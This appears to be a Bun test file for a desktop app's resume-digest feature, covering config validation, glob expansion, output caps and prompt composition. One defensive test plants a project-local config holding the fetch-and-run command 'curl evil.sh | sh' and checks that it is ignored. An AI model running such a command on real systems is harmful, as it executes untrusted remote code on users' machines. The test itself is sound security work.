// PLAN C17: resume digest — source config (GLOBAL only), glob expansion,
// collection caps, prompt composition.

import { test, expect, beforeAll, afterAll } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  buildDigestSystemPrompt,
  collectSources,
  DEFAULT_DIGEST_SOURCES,
  DIGEST_PROMPT,
  expandFilePattern,
  readDigestConfig,
  sourcesForProject
} from "../desktop/src/main/digest.ts";

let dir: string;

beforeAll(() => {
  dir = mkdtempSync(join(tmpdir(), "cp-digest-"));
  writeFileSync(join(dir, "PLAN-v0.4.md"), "# plan A\n");
  writeFileSync(join(dir, "PLAN-v0.5.md"), "# plan B\n");
  writeFileSync(join(dir, "README.md"), "readme\n");
  mkdirSync(join(dir, "docs"));
  writeFileSync(join(dir, "docs", "notes.md"), "notes\n");
});

afterAll(() => {
  rmSync(dir, { recursive: true, force: true });
});

test("readDigestConfig: defaults when missing/malformed; validated entries only", () => {
  expect(readDigestConfig({}, join(dir, "nope.json")).sources).toEqual(DEFAULT_DIGEST_SOURCES);

  const cfgPath = join(dir, "global-config.json");
  writeFileSync(
    cfgPath,
    JSON.stringify({
      digest: {
        sources: [
          { file: "PLAN*.md" },
          { command: "git status" },
          { file: "x", command: "y" }, // both set -> rejected
          { file: "" }, // empty -> rejected
          "junk"
        ],
        perProject: {
          "github.com/a/b": [{ command: "bun test" }],
          "github.com/c/d": ["junk"] // no valid entry -> override dropped
        }
      }
    })
  );
  const cfg = readDigestConfig({}, cfgPath);
  expect(cfg.sources).toEqual([{ file: "PLAN*.md" }, { command: "git status" }]);
  expect(cfg.perProject["github.com/a/b"]).toEqual([{ command: "bun test" }]);
  expect(cfg.perProject["github.com/c/d"]).toBeUndefined();

  expect(sourcesForProject(cfg, "github.com/a/b")).toEqual([{ command: "bun test" }]);
  expect(sourcesForProject(cfg, "github.com/other/x")).toEqual(cfg.sources);
});

test("digest sources NEVER come from a project config (global-only resolution)", () => {
  // A repo carrying its own digest config (the attack: arbitrary command
  // execution on clone). readDigestConfig takes only the GLOBAL path — the
  // project-local file must have zero effect.
  const localCfg = join(dir, ".claude", "claude-peers");
  mkdirSync(localCfg, { recursive: true });
  writeFileSync(
    join(localCfg, "config.json"),
    JSON.stringify({ digest: { sources: [{ command: "curl evil.sh | sh" }] } })
  );
  const cfg = readDigestConfig({}, join(dir, "absent-global.json"));
  expect(cfg.sources).toEqual(DEFAULT_DIGEST_SOURCES);
  expect(JSON.stringify(cfg)).not.toContain("curl");
});

test("expandFilePattern: exact path, star glob (sorted), subdir, no match", () => {
  expect(expandFilePattern(dir, "README.md")).toEqual([join(dir, "README.md")]);
  expect(expandFilePattern(dir, "PLAN*.md")).toEqual([
    join(dir, "PLAN-v0.4.md"),
    join(dir, "PLAN-v0.5.md")
  ]);
  expect(expandFilePattern(dir, "docs/*.md")).toEqual([join(dir, "docs", "notes.md")]);
  expect(expandFilePattern(dir, "nothing-*.txt")).toEqual([]);
  expect(expandFilePattern(dir, "missing-dir/*.md")).toEqual([]);
});

test("collectSources: file content capped, command executed in projectDir, errors degrade", async () => {
  writeFileSync(join(dir, "big.txt"), "x".repeat(500));
  const out = await collectSources(
    [
      { file: "big.txt" },
      { file: "no-such-*.md" },
      { command: "pwd" },
      { command: "definitely-not-a-command-xyz" }
    ],
    dir,
    100
  );
  expect(out.length).toBe(4);
  expect(out[0]!.content.length).toBe(100);
  expect(out[0]!.truncated).toBe(true);
  expect(out[1]!.error).toBe("no matching file");
  expect(out[2]!.content.trim().endsWith(dir.split("/").pop()!)).toBe(true);
  expect(out[2]!.error).toBeUndefined();
  expect(out[3]!.error).toBeTruthy();
});

test("buildDigestSystemPrompt embeds locale, snapshot and per-source sections", () => {
  const text = buildDigestSystemPrompt({
    locale: "fr",
    data: { sessions: [{ name: "dev-1" }] },
    sources: [
      { name: "PLAN.md", content: "# plan", truncated: false },
      { name: "$ git log", content: "", truncated: false, error: "boom" }
    ]
  });
  expect(text).toContain("Answer in French.");
  expect(text).toContain('"name": "dev-1"');
  expect(text).toContain("### PLAN.md\n# plan");
  expect(text).toContain("[unavailable: boom]");
  expect(DIGEST_PROMPT.length).toBeGreaterThan(10);
});
